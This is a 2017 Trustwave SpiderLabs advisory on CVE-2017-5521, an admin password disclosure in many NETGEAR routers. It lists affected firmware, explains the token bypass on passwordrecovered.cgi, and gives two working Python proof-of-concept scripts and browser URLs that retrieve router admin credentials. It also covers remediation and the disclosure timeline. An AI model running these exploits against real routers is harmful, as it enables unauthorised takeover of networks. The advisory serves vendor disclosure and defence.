@@ -1,0 +1,358 @@
+Trustwave SpiderLabs Security Advisory TWSL2017-003:
+Multiple Vulnerabilities in NETGEAR Routers
+
+Published: 01/30/2017 
+Version: 1.0
+
+Vendor: NETGEAR (http://www.netgear.com/)
+Product: Multiple products
+
+Finding 1: Remote and Local Password Disclosure
+Credit: Simon Kenin of Trustwave SpiderLabs
+CVE: CVE-2017-5521
+
+Version affected: 
+ 
+# AC1450 V1.0.0.34_10.0.16 (Latest)
+# AC1450 V1.0.0.22_1.0.10
+# AC1450 V1.0.0.14_1.0.6
+# D6400 V1.0.0.44_1.0.44 (V1.0.0.52_1.0.52 and above not affected)
+# D6400 V1.0.0.34_1.3.34
+# D6400 V1.0.0.38_1.1.38
+# D6400 V1.0.0.22_1.0.22
+# DC112A V1.0.0.30_1.0.60 (Latest)
+# DGN2200v4 V1.0.0.24_5.0.8 (V1.0.0.66_1.0.66 is latest and is not affected)
+# JNDR3000 V1.0.0.18_1.0.16 (Latest)
+# R6200 V1.0.1.48_1.0.37 (V1.0.1.52_1.0.41 and above are not affected)
+# R6200v2 V1.0.1.20_1.0.18 (V1.0.3.10_10.1.10 is latest and is not affected)
+# R6250 V1.0.1.84_1.0.78 (V1.0.4.2_10.1.10 is latest and is not affected)
+# R6300	V1.0.2.78_1.0.58 (Latest)
+# R6300v2 V1.0.4.2_10.0.74 (V1.0.4.6_10.0.76 is latest and is patched)
+# R6300v2 V1.0.3.30_10.0.73
+# R6700 V1.0.1.14_10.0.29 (Latest beta)
+# R6700 V1.0.0.26_10.0.26 (Latest stable)
+# R6700 V1.0.0.24_10.0.18
+# R6900 V1.0.0.4_1.0.10 (Latest)
+# R7000 V1.0.6.28_1.1.83 (V1.0.7.2_1.1.93 is latest and is patched)
+# R8300 V1.0.2.48_1.0.52
+# R8500 V1.0.2.30_1.0.43 (V1.0.2.64_1.0.62 and above is patched)
+# R8500 V1.0.2.26_1.0.41
+# R8500 V1.0.0.56_1.0.28
+# R8500 V1.0.0.20_1.0.11
+# VEGN2610 V1.0.0.35_1.0.35 (Latest)
+# VEGN2610 V1.0.0.29_1.0.29
+# VEGN2610 V1.0.0.27_1.0.27
+# WNDR3400v2 V1.0.0.16_1.0.34 (V1.0.0.52_1.0.81 is latest and is not affected)
+# WNDR3400v3 V1.0.0.22_1.0.29 (V1.0.1.2_1.0.51 is latest and is not affected)
+# WNDR3700v3 V1.0.0.38_1.0.31 (Latest)
+# WNDR4000 V1.0.2.4_9.1.86 (Latest)
+# WNDR4500 V1.0.1.40_1.0.68 (Latest)
+# WNDR4500v2 V1.0.0.60_1.0.38 (Latest)
+# WNDR4500v2 V1.0.0.42_1.0.25
+# WGR614v10 V1.0.2.60_60.0.85NA (Latest)
+# WGR614v10 V1.0.2.58_60.0.84NA
+# WGR614v10 V1.0.2.54_60.0.82NA
+# WN3100RP V1.0.0.14_1.0.19 (Latest)
+# WN3100RP V1.0.0.6_1.0.12
+
+# Lenovo R3220 V1.0.0.16_1.0.16 (Latest)
+# Lenovo R3220 V1.0.0.13_1.0.13
+
+
+Product description:
+Multiple Netgear Routers
+
+Many Netgear routers are prone to password disclosure via simple crafted 
+requests to the web management server. The bug is exploitable remotely if the 
+remote management option is set and can also be exploited given access to the 
+router over LAN or WLAN.
+
+When trying to access the web panel a user is asked to authenticate, if the 
+authentication is cancelled and password recovery is not enabled, the user is 
+redirected to a page which exposes a password recovery token. If a user 
+supplies the correct token to the page 
+http://router/passwordrecovered.cgi?id=TOKEN (and password recovery is not 
+enabled), they will receive the admin password for the router. 
+
+If password recovery is set the exploit will fail, as it will ask the user for the recovery 
+questions which were previously set when enabling the feature, this is 
+persistent, even after disabling the recovery option the exploit will fail, 
+because the router will ask for the security questions.
+This can easily be reproduced using the attached poc, or by sending these two 
+simple requests via the browser:
+1. http://router/.../ will redirect you to http://router/..../unauth.cgi?id=TOKEN to acquire the token
+2. http://router/passwordrecovered.cgi?id=TOKEN will give you credentials (some models require you to send a post request instead of get)
+
+## netgore.py
+import sys
+import requests
+
+
+def scrape(text, start_trig, end_trig):
+    if text.find(start_trig) != -1:
+	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
+    else:
+        return "i_dont_speak_english"
+#disable nasty insecure ssl warning
+requests.packages.urllib3.disable_warnings()
+#1st stage - get token
+ip = sys.argv[1]
+port = sys.argv[2]
+url = 'http://' + ip + ':' + port + '/'
+try:
+	r = requests.get(url)
+except:
+	url = 'https://' + ip + ':' + port + '/'
+	r = requests.get(url, verify=False)
+model = r.headers.get('WWW-Authenticate')
+if model is not None:
+	print "Attcking: " + model[13:-1]
+else:
+	print "not a netgear router"
+	sys.exit(0)
+token = scrape(r.text, 'unauth.cgi?id=', '\"')
+if token == 'i_dont_speak_english':
+	print "not vulnerable"
+	sys.exit(0)
+print "token found: " + token
+#2nd stage - pass the token - get the password
+url = url + 'passwordrecovered.cgi?id=' + token
+r = requests.post(url, verify=False)
+#profit
+if r.text.find('left\">') != -1:
+	username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
+	username = scrape(username, '>', '\'')
+	password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
+	password = scrape(password, '>', '\'')
+	if username == "i_dont_speak_english":
+		username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
+		password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
+else:
+	print "not vulnerable becuse password recovery IS set"
+	sys.exit(0)
+#html encoding pops out of nowhere, lets replace that
+password = password.replace("&#35;","#")
+password = password.replace("&","&")
+print "user: " + username
+print "pass: " + password
+
+================================
+Just run the PoC against a router to get the credentials if it is vulnerable.
+
+
+
+Finding 2: Remote and Local Password Disclosure
+Credit: Simon Kenin of Trustwave SpiderLabs
+CVE: CVE-2017-5521
+
+Version affected:  
+
+# AC1450 V1.0.0.34_10.0.16 (Latest)
+# AC1450 V1.0.0.22_1.0.10
+# AC1450 V1.0.0.14_1.0.6
+# D6300 V1.0.0.96_1.1.96 (Latest)
+# D6300B V1.0.0.36_1.0.36
+# D6300B V1.0.0.32_1.0.32
+# D6400 V1.0.0.44_1.0.44 (V1.0.0.52_1.0.52 is latest and is patched)
+# D6400 V1.0.0.22_1.0.22
+# DC112A V1.0.0.30_1.0.60 (Latest)
+# DGN2200v4 V1.0.0.76_1.0.76 (Latest)
+# DGN2200v4 V1.0.0.66_1.0.66
+# DGN2200Bv4 V1.0.0.68_1.0.68 (Latest)
+# JNDR3000 V1.0.0.18_1.0.16 (Latest)
+# R6200 V1.0.1.56_1.0.43 (Latest)
+# R6200 V1.0.1.52_1.0.41
+# R6200 V1.0.1.48_1.0.37
+# R6200v2 V1.0.3.10_10.1.10 (Latest)
+# R6200v2 V1.0.1.20_1.0.18
+# R6250 V1.0.4.6_10.1.12 (Latest beta)
+# R6250 V1.0.4.2_10.1.10 (Latest stable)
+# R6250 V1.0.1.84_1.0.78 
+# R6300	V1.0.2.78_1.0.58 (Latest)
+# R6300v2 V1.0.4.2_10.0.74 (V1.0.4.6_10.0.76 is latest and is patched)
+# R6300v2 V1.0.3.6_1.0.63CH (Charter Comm.)
+# R6400 V1.0.0.26_1.0.14 (V1.0.1.12_1.0.11 is latest and is patched)
+# R6700 V1.0.0.26_10.0.26 (Latest)
+# R6700 V1.0.0.24_10.0.18
+# R6900 V1.0.0.4_1.0.10 (Latest)
+# R7000 V1.0.6.28_1.1.83 (V1.0.7.2_1.1.93 is latest and is patched)
+# R7000 V1.0.4.30_1.1.67
+# R7900 V1.0.1.8_10.0.14 (Latest beta)
+# R7900 V1.0.1.4_10.0.12 (Latest stable)
+# R7900 V1.0.0.10_10.0.7
+# R7900 V1.0.0.8_10.0.5
+# R7900 V1.0.0.6_10.0.4
+# R8000 V1.0.3.26_1.1.18 (Latest beta)
+# R8000 V1.0.3.4_1.1.2 (Latest stable)
+# R8300 V1.0.2.48_1.0.52
+# R8500 V1.0.0.56_1.0.28 (V1.0.2.64_1.0.62 and above is patched)
+# R8500 V1.0.2.30_1.0.43
+# VEGN2610 V1.0.0.35_1.0.35 (Latest)
+# VEGN2610 V1.0.0.27_1.0.27
+# VEGN2610-1FXAUS V1.0.0.36_1.0.36 (Latest)
+# VEVG2660 V1.0.0.23_1.0.23
+# WNDR3400v2 V1.0.0.52_1.0.81 (Latest)
+# WNDR3400v3 V1.0.1.4_1.0.52 (Latest)
+# WNDR3400v3 V1.0.1.2_1.0.51
+# WNDR3400v3 V1.0.0.22_1.0.29
+# WNDR3700v3 V1.0.0.38_1.0.31 (Latest)
+# WNDR4000 V1.0.2.4_9.1.86 (Latest)
+# WNDR4500 V1.0.1.40_1.0.68 (Latest)
+# WNDR4500 V1.0.1.6_1.0.24 
+# WNDR4500v2 V1.0.0.60_1.0.38 (Latest)
+# WNDR4500v2 V1.0.0.50_1.0.30
+# WNR1000v3 V1.0.2.68_60.0.93NA (Latest)
+# WNR1000v3 V1.0.2.62_60.0.87 (Latest)
+# WNR3500Lv2 V1.2.0.34_40.0.75 (Latest)
+# WNR3500Lv2 V1.2.0.32_40.0.74
+# WGR614v10 V1.0.2.60_60.0.85NA (Latest)
+# WGR614v10 V1.0.2.58_60.0.84NA
+# WGR614v10 V1.0.2.54_60.0.82NA
+
+# Lenovo R3220 V1.0.0.16_1.0.16 (Latest)
+# Lenovo R3220 V1.0.0.13_1.0.13
+
+
+Many Netgear routers are prone to password disclosure via simple crafted 
+request to the web management server. The bug is exploitable remotely if the 
+remote management option is set and can also be exploited given access to the 
+router over LAN or WLAN.
+
+Netgear routers have an option to restore forgotten password via 2 security 
+questions. If the recovery option is disabled (which is the default), it is 
+still possible to recover the password by sending a correct token to the 
+recovery page. 
+
+If a user supplies the correct token to the page 
+http://router/passwordrecovered.cgi?id=TOKEN (and password recovery is not 
+enabled), they will receive the admin password for the router. If password 
+recovery is set the exploit will fail, as it will ask the user for the recovery 
+questions which were previously set when enabling the feature, this is 
+persistent, even after disabling the recovery option, the exploit will fail, 
+because the router will ask for the security questions.
+
+This mechanism does not work correctly on the very first request to 
+"passwordrecovered.cgi" and the token is not properly checked, this means that 
+any TOKEN value will result in disclosure of the password.
+The issue occurs after every reboot of the router.
+
+This can easily be reproduced using the attached poc, or by sending a simple 
+request via the browser:
+1. http://router/passwordrecovered.cgi?id=Trustwave_SpiderLabs will give you credentials (some models require you to send a post request instead of get)
+
+## netgore2.py
+import sys
+import requests
+
+def scrape(text, start_trig, end_trig):
+    if text.find(start_trig) != -1:
+	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
+    else:
+        return "i_dont_speak_english"
+#disable nasty insecure ssl warning
+requests.packages.urllib3.disable_warnings()
+#1st stage
+ip = sys.argv[1]
+port = sys.argv[2]
+url = 'http://' + ip + ':' + port + '/'
+try:
+	r = requests.get(url)
+except:
+	url = 'https://' + ip + ':' + port + '/'
+	r = requests.get(url, verify=False)
+model = r.headers.get('WWW-Authenticate')
+if model is not None:
+	print "Attcking: " + model[13:-1]
+else:
+	print "not a netgear router"
+	sys.exit(0)
+#2nd stage
+url = url + 'passwordrecovered.cgi?id=get_rekt'
+try:
+	r = requests.post(url, verify=False)
+except:
+	print "not vulnerable router"
+	sys.exit(0)
+#profit
+if r.text.find('left\">') != -1:
+	username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
+	username = scrape(username, '>', '\'')
+	password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
+	password = scrape(password, '>', '\'')
+	if username == "i_dont_speak_english":
+		username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
+		password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
+else:
+	print "not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again"
+	sys.exit(0)
+#html encoding pops out of nowhere, lets replace that
+password = password.replace("&#35;","#")
+password = password.replace("&","&")
+print "user: " + username
+print "pass: " + password
+
+================================
+Just run the PoC against a router to get the credentials if it is vulnerable.
+
+
+
+
+Remediation Steps:
+Please see NETGEAR's KBA for list of firmware patches for various models. As a 
+workaround, the bug only works when password recovery is NOT set. If you do set 
+password recovery this is not exploitable.
+
+Revision History:
+04/06/2016 - Vulnerability disclosed to vendor
+04/19/2016 - Request for update and received confirmation of receipt of the advisories
+05/18/2016 - Request for update; no response
+07/14/2016 - Request for update
+07/15/2016 - Notice of patch for some models and workaround KBA received along with commitment towards 100% coverage
+10/17/2016 - Request for update
+12/15/2016 - Notice of intent to publish advisories
+01/04/2017 - Vendor responds with patch timeline and announcement of participation in Bugcrowd
+01/30/2017 - Advisory published
+
+
+References
+1. http://c1ph04text.blogspot.com/2014/01/mitrm-attacks-your-middle-or-mine.html
+2. https://www.exploit-db.com/exploits/32883/
+3. http://kb.netgear.com/30632/Web-GUI-Password-Recovery-and-Exposure-Security-Vulnerability
+
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
